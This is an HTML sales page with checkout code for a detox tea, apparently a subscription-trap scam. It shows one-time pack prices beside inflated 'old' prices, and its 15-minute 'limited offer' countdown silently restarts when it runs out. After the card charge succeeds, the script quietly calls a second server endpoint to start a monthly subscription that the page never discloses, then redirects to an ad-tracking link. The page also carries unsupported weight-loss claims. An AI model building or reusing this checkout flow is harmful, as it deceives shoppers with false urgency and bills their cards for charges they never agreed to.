<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>HealthyTox ‚Ä¢ Detox Tea Offer</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800;900&display=swap" rel="stylesheet"/>
<style>
  :root{
    --brand:#ee2c7c; /* matches product pink tone */
    --brand-2:#22a559;
    --ink:#0e1116;
    --muted:#5b6472;
    --line:#e5e7eb;
    --radius:18px;
  }
  *{box-sizing:border-box}
  html,body{height:100%}
  body{
    margin:0;
    font:16px/1.5 Inter,system-ui,-apple-system,"Segoe UI",Roboto,Arial;
    color:var(--ink);
    background:#fff;
  }

  /* Top ribbon */
  .ribbon{
    background:#0e2b5c;
    color:#fff;
    font-weight:800;
    text-transform:uppercase;
    letter-spacing:.3px;
  }
  .ribbon .wrap{display:flex;align-items:center;gap:14px; padding:10px 16px; max-width:1200px; margin:0 auto}
  .timer{margin-left:auto; display:flex; gap:18px; font-weight:900}
  .timer span{display:flex; gap:6px; align-items:center}
  .pill{background:rgba(255,255,255,.12); padding:4px 10px; border-radius:999px}

  /* Hero */
  .hero{
    background:#fdf6f9;
    border-bottom:1px solid var(--line);
  }
  .hero .wrap{max-width:1200px; margin:0 auto; padding:30px 16px; display:grid; grid-template-columns: 1.2fr 1fr; gap:24px; align-items:center}
  .brand{ display:flex; align-items:center; gap:10px; font-weight:900; font-size:40px }
  .leaf{width:28px;height:28px;border-radius:50%;background:var(--brand-2);display:inline-block;position:relative}
  .leaf:after{content:""; position:absolute; inset:6px 10px 6px 6px; border-radius:50% 10% 50% 50%/50% 10% 50% 50%; background:#fff; transform:rotate(-35deg)}
  .hero h1{font-size:36px;margin:14px 0 10px}
  .badges{display:grid; grid-template-columns: repeat(4,1fr); gap:10px; margin-top:16px}
  .badge{background:#fff;border:1px solid var(--line);border-radius:14px;padding:14px;text-align:center}
  .badge b{display:block;margin-top:6px}

  .product-hero{
    min-height:260px;
    border-radius:22px;
    border:1px solid var(--line);
    background:#fff url('maindetox.jpg') center/cover no-repeat;
  }

  /* Main */
  .main{max-width:1200px;margin:0 auto; padding:24px 16px; display:grid; grid-template-columns: 1fr 420px; gap:24px}
  @media (max-width:1000px){ .hero .wrap{grid-template-columns:1fr} .main{grid-template-columns:1fr} }

  .card{background:#fff;border:1px solid var(--line); border-radius:var(--radius); box-shadow:0 6px 20px rgba(2,18,8,.05)}
  .card .pad{padding:18px}

  /* Packs grid */
  .packs{display:grid; grid-template-columns:repeat(3,1fr); gap:12px}
  @media (max-width:640px){ .packs{grid-template-columns:1fr} }
  .pack{border:2px solid var(--line);border-radius:16px;padding:14px; cursor:pointer; position:relative; display:grid; gap:6px; align-content:start}
  .pack.active{border-color:var(--brand); box-shadow:0 0 0 3px rgba(238,44,124,.15)}
  .tag{position:absolute; top:10px; left:10px; background:#0e2b5c; color:#fff; font-size:12px; padding:4px 8px; border-radius:999px}
  .old{color:#9aa2ad; text-decoration:line-through; font-weight:600}
  .price{font-size:26px; font-weight:900; color:#0e7f3d}
  .pack img{width:120px; height:auto}

  /* Checkout side */
  .checkout .head{display:flex; align-items:center; justify-content:space-between; border-bottom:1px solid var(--line); padding:14px 18px}
  .checkout h3{margin:0;font-size:20px}
  .row{display:grid; grid-template-columns:1fr 1fr; gap:10px}
  .input,.el,select{ width:100%; padding:12px 14px; border:1.6px solid var(--line); border-radius:12px; background:#fff; color:#000 }
  .input:focus,.el:focus,select:focus{ outline:none; border-color:#ffd7e8; box-shadow:0 0 0 3px rgba(238,44,124,.15) }
  .el{ background:#fff }

  .paybtn{width:100%; padding:14px 16px; border-radius:12px; background:var(--brand); color:#fff; font-weight:900; border:none; cursor:pointer}
  .paybtn:hover{filter:saturate(1.06) brightness(0.98)}
  .muted{color:var(--muted); font-size:14px}
  .trust{display:flex; gap:14px; justify-content:center; padding:12px; border-top:1px solid var(--line)}
  .trust img{height:22px; opacity:.8}

  .list{display:grid; gap:10px; margin-top:6px}
  .list .li{display:flex; gap:10px}
  .check{width:18px;height:18px;border-radius:4px;background:#ffebf4; display:inline-flex; align-items:center; justify-content:center}
  .check:after{content:"‚úì"; font-size:12px; color:#d41164}

  /* loading */
  .overlay{ position:fixed; inset:0; background:rgba(0,0,0,.6); display:none; align-items:center; justify-content:center; z-index:100 }
  .overlay[aria-hidden="false"]{ display:flex }
  .box{ background:#fff; border-radius:16px; max-width:520px; width:92vw; padding:22px; text-align:center; box-shadow:0 10px 28px rgba(0,0,0,.3) }
  .bar{ height:10px; width:100%; background:#eef2f5; border-radius:999px; overflow:hidden; margin-top:10px}
  .bar span{display:block; height:100%; width:0; background:linear-gradient(90deg,var(--brand),#ff9ec5); animation:load 2.2s ease-in-out infinite; border-radius:inherit}
  @keyframes load{ 0%{width:0%} 60%{width:85%} 100%{width:100%} }

  #err{ margin-top:10px; font-size:14px; color:#b00020; background:#fde9eb; border:1px solid #e5b2b8; border-radius:10px; padding:8px; display:none }
  #err[aria-hidden="false"]{ display:block }

  footer{padding:30px 16px; color:#3b4450; border-top:1px solid var(--line); text-align:center}
</style>
</head>
<body>
  <!-- Top ribbon -->
  <div class="ribbon">
    <div class="wrap">
      <div><span class="pill">Limited offer</span></div>
      <div class="timer" aria-live="polite">
        <span><strong id="hh">00</strong> Hrs</span>
        <span><strong id="mm">15</strong> Min</span>
        <span><strong id="ss">00</strong> Sec</span>
      </div>
    </div>
  </div>

  <!-- Hero -->
  <section class="hero">
    <div class="wrap">
      <div>
        <div class="brand"><span class="leaf"></span> HealthyTox</div>
        <h1>Detox Energizing Tea ‚Äî Feel lighter, daily.</h1>
        <div class="badges">
          <div class="badge">‚öñÔ∏è <b>Supports weight loss</b></div>
          <div class="badge">ü´ß <b>Reduces bloating</b></div>
          <div class="badge">‚ö° <b>Boosts metabolism</b></div>
          <div class="badge">üßò <b>Good for body & mind</b></div>
        </div>
      </div>
      <div class="product-hero"></div>
    </div>
  </section>

  <!-- Main content -->
  <section class="main">
    <!-- Left: packs and guarantees -->
    <div class="card">
      <div class="pad">
        <div class="packs" id="packGrid">
          <div class="pack active" data-pack="3">
            <span class="tag">Most Popular</span>
            <img src="d3.jpg" alt="3 pack">
            <h4>3x Detox Tea Packs <small>(84 tea bags)</small></h4>
            <div class="old">$186.90</div>
            <div class="price">$55.95</div>
          </div>
          <div class="pack" data-pack="2">
            <img src="d2.jpg" alt="2 pack">
            <h4>2x Detox Tea Packs <small>(56 tea bags)</small></h4>
            <div class="old">$143.80</div>
            <div class="price">$42.85</div>
          </div>
          <div class="pack" data-pack="1">
            <img src="d1.jpg" alt="1 pack">
            <h4>1x Detox Tea Pack <small>(28 tea bags)</small></h4>
            <div class="old">$85.90</div>
            <div class="price">$25.95</div>
          </div>
        </div>

        <div class="card" style="margin-top:14px">
          <div class="pad">
            <h3>Why shop with us?</h3>
            <div class="list">
              <div class="li"><span class="check"></span><div><b>30-Day Money Back</b> ‚Äî Try it risk-free.</div></div>
              <div class="li"><span class="check"></span><div><b>Shop with confidence</b> ‚Äî Fast, secure checkout.</div></div>
              <div class="li"><span class="check"></span><div><b>Your privacy matters</b> ‚Äî 256‚Äëbit SSL encryption.</div></div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- Right: checkout -->
    <div class="card checkout" id="checkoutCard">
      <div class="head">
        <h3>Express Checkout</h3>
        <div class="muted">Powered by Stripe</div>
      </div>
      <div class="pad">
        <div class="row" style="margin-bottom:8px">
          <input id="emailInput" class="input" type="email" placeholder="Email address"/>
          <input id="nameInput" class="input" placeholder="Full name"/>
        </div>
        <div class="row" style="margin-bottom:8px">
          <div class="row" style="grid-template-columns:160px 1fr; gap:10px">
            <select id="phonePrefix" class="input" aria-label="Country calling code"></select>
            <input id="phoneNumber" class="input" inputmode="tel" placeholder="Phone number"/>
          </div>
        </div>
        <div class="row" style="margin-bottom:8px">
          <input id="billingStreet" class="input" placeholder="Address line 1"/>
          <input id="billingCity" class="input" placeholder="City"/>
        </div>
        <div class="row" style="margin-bottom:8px">
          <input id="billingPostcode" class="input" placeholder="Postal code"/>
          <select id="billingCountry" class="input"></select>
        </div>

        <div class="muted" style="margin:8px 0 4px">Card number</div>
        <div id="card-number" class="el"></div>
        <div class="row" style="margin-top:8px">
          <div>
            <div class="muted" style="margin:8px 0 4px">Expiry</div>
            <div id="card-expiry" class="el"></div>
          </div>
          <div>
            <div class="muted" style="margin:8px 0 4px">CVC</div>
            <div id="card-cvc" class="el"></div>
          </div>
        </div>

        <div id="err" role="alert" aria-hidden="true"></div>

        <button id="payNow" class="paybtn" style="margin-top:12px">Order Now</button>
        <p class="muted" style="margin:10px 0 0">üîí 256‚Äëbit SSL Secure Payment</p>
      </div>
      <div class="trust">
        <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa"/>
        <img src="https://charmr.xyz/logos/mc2.png" alt="Mastercard"/>
        <img src="https://charmr.xyz/logos/amex.png" alt="Amex"/>
        <img src="https://www.gstatic.com/instantbuy/svg/dark_gpay.svg" alt="GPay"/>
      </div>
    </div>
  </section>

  <!-- Loading overlay -->
  <div id="overlay" class="overlay" aria-hidden="true">
    <div class="box">
      <h3>Processing your payment‚Ä¶</h3>
      <div class="bar"><span></span></div>
      <p class="muted">Please wait, this may take a few seconds.</p>
    </div>
  </div>

  <footer>
    <b>Disclaimer:</b> Statements have not been evaluated by any food or drug authority. HealthyTox products are not intended to diagnose, treat, cure, or prevent disease. Consult a physician if you are pregnant, nursing, or have a medical condition.
  </footer>

  <!-- Stripe.js -->
  <script src="https://js.stripe.com/v3"></script>
  <script>
    /* ---------- Countdown (15 minutes, loops) ---------- */
    (function countdownLoop(){
      const hh=document.getElementById('hh'), mm=document.getElementById('mm'), ss=document.getElementById('ss');
      const DURATION_MS = 15*60*1000; // 15 min
      let end = Date.now() + DURATION_MS;
      function fmt(n){ return String(n).padStart(2,'0'); }
      function tick(){
        const left = Math.max(0, end - Date.now());
        const s = Math.floor(left/1000)%60;
        const m = Math.floor(left/60000)%60;
        const h = Math.floor(left/3600000);
        hh.textContent = fmt(h); mm.textContent = fmt(m); ss.textContent = fmt(s);
        if(left<=0){ end = Date.now() + DURATION_MS; } // restart
        requestAnimationFrame(tick);
      }
      tick();
    })();

    /* ---------- Country calling codes & helpers ---------- */
    const CALLING_CODES = { ZA:{code:'+27',name:'South Africa'}, US:{code:'+1',name:'United States'}, CA:{code:'+1',name:'Canada'}, GB:{code:'+44',name:'United Kingdom'}, IE:{code:'+353',name:'Ireland'}, AU:{code:'+61',name:'Australia'}, NZ:{code:'+64',name:'New Zealand'}, DE:{code:'+49',name:'Germany'}, FR:{code:'+33',name:'France'}, ES:{code:'+34',name:'Spain'}, IT:{code:'+39',name:'Italy'}, NL:{code:'+31',name:'Netherlands'}, SE:{code:'+46',name:'Sweden'}, NO:{code:'+47',name:'Norway'}, DK:{code:'+45',name:'Denmark'}, AT:{code:'+43',name:'Austria'}, CH:{code:'+41',name:'Switzerland'}, BE:{code:'+32',name:'Belgium'}, FI:{code:'+358',name:'Finland'} };
    function buildPrefixOptions(selectEl, preferCode){
      if(!selectEl) return;
      selectEl.innerHTML="";
      const entries=Object.entries(CALLING_CODES);
      const prefer=CALLING_CODES[preferCode]?preferCode:'DE';
      const first=CALLING_CODES[prefer]||CALLING_CODES.DE;
      selectEl.append(new Option(`${first.code} ‚Äî ${first.name}`, first.code, true, true));
      const seen=new Set([first.code]);
      for(const [,data] of entries){
        if(seen.has(data.code)) continue;
        selectEl.append(new Option(`${data.code} ‚Äî ${data.name}`, data.code));
        seen.add(data.code);
      }
      if(!selectEl.value) selectEl.value=first.code;
    }
    buildPrefixOptions(document.getElementById('phonePrefix'),'DE');

    (function initCountries(){
      const sel=document.getElementById('billingCountry');
      const items=['DE','AT','CH','NL','BE','FR','ES','IT','DK','SE','NO','FI','IE','GB','US','CA'];
      const names={DE:'Germany',AT:'Austria',CH:'Switzerland',NL:'Netherlands',BE:'Belgium',FR:'France',ES:'Spain',IT:'Italy',DK:'Denmark',SE:'Sweden',NO:'Norway',FI:'Finland',IE:'Ireland',GB:'United Kingdom',US:'United States',CA:'Canada'};
      items.forEach((cc,i)=> sel.appendChild(new Option(names[cc], cc, i===0, i===0)));
    })();

    /* ---------- Pack selector (UI only) ---------- */
    document.querySelectorAll('.pack').forEach(el=>{
      el.addEventListener('click',()=>{
        document.querySelectorAll('.pack').forEach(p=>p.classList.remove('active'));
        el.classList.add('active');
      });
    });

    /* ---------- Stripe Elements & payment logic (EXACT flow from us-ipn17.html) ---------- */
    const SUBSCRIBE_URL = "https://your-domain.com/api/stripe/charge-50";
    const PUBLISHABLE_KEY = "pk_live_51Rhm4sEJXIhiKzYGIPVjXwZTzuKmqU7EOA6EpDIkrNTmtm4ooWHbDcSaBlyglSdJYhCyU4VgcI8Qo09Acc8upCUD00ekSRuN4q";
    const MONTHLY_PRICE_ID = "price_1RvJmqEJXIhiKzYGE0IJQp7t";

    const stripe = Stripe(PUBLISHABLE_KEY);
    const elements = stripe.elements();
    const cardNumber=elements.create("cardNumber");
    const cardExpiry=elements.create("cardExpiry");
    const cardCvc=elements.create("cardCvc");
    cardNumber.mount("#card-number"); cardExpiry.mount("#card-expiry"); cardCvc.mount("#card-cvc");

    const $err=document.getElementById("err");
    function showError(m){ $err.textContent=m; $err.setAttribute('aria-hidden','false'); }
    function hideError(){ $err.textContent=""; $err.setAttribute('aria-hidden','true'); }
    const overlay=document.getElementById('overlay');
    function showLoading(){ overlay.setAttribute('aria-hidden','false'); }
    function hideLoading(){ overlay.setAttribute('aria-hidden','true'); }

    const nameInput=document.getElementById('nameInput');
    const emailInput=document.getElementById('emailInput');
    const phonePrefix=document.getElementById('phonePrefix');
    const phoneNumber=document.getElementById('phoneNumber');
    const billingStreet   = document.getElementById('billingStreet');
    const billingCity     = document.getElementById('billingCity');
    const billingPostcode = document.getElementById('billingPostcode');
    const billingCountry  = document.getElementById('billingCountry');

    document.getElementById("payNow").onclick = async () => {
      hideError(); showLoading();
      const rawPhone=(phoneNumber?.value||'').replace(/[^\d]/g,'');
      const prefix=(phonePrefix?.value||'+49').trim();
      const fullPhone = rawPhone ? `${prefix}${rawPhone}` : undefined;
      const addr = { line1:(billingStreet?.value||'').trim()||undefined, city:(billingCity?.value||'').trim()||undefined, postal_code:(billingPostcode?.value||'').trim()||undefined, country:(billingCountry?.value||'').trim()||undefined };

      const pm = await stripe.createPaymentMethod({ type:"card", card:cardNumber, billing_details:{ name:nameInput.value||undefined, email:emailInput.value||undefined, phone:fullPhone, address:addr } });
      if(pm.error){ hideLoading(); showError(pm.error.message); return; }

      try{
        const res = await fetch(SUBSCRIBE_URL,{ method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({ paymentMethodId:pm.paymentMethod.id, name:nameInput.value, email:emailInput.value, phone:fullPhone, address:addr }) });
        const data = await res.json();
        if(data.error){ hideLoading(); showError(data.error); return; }
        if(!data.clientSecret){ hideLoading(); showError("Payment failed"); return; }

        const conf = await stripe.confirmCardPayment(data.clientSecret);
        if(conf.error){ hideLoading(); showError(conf.error.message); return; }
        if(!(conf.paymentIntent && conf.paymentIntent.status === "succeeded")){ hideLoading(); showError("Payment not completed"); return; }

        const subRes = await fetch("https://charmr-jfmc.onrender.com/api/stripe/start-monthly-after-trial",{ method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({ paymentIntentId:data.paymentIntentId, priceIdMonthly:MONTHLY_PRICE_ID }) });
        const subData = await subRes.json();
        if(subData.error){ hideLoading(); showError(subData.error); return; }

        window.location.href = "https://cudsr.bemobtrcks.com/go/e1420adb-fbc5-4cfe-b0f1-10615c05e062?";
      }catch(e){ hideLoading(); showError(e.message||"Something went wrong"); }
    };
  </script>
</body>
</html>
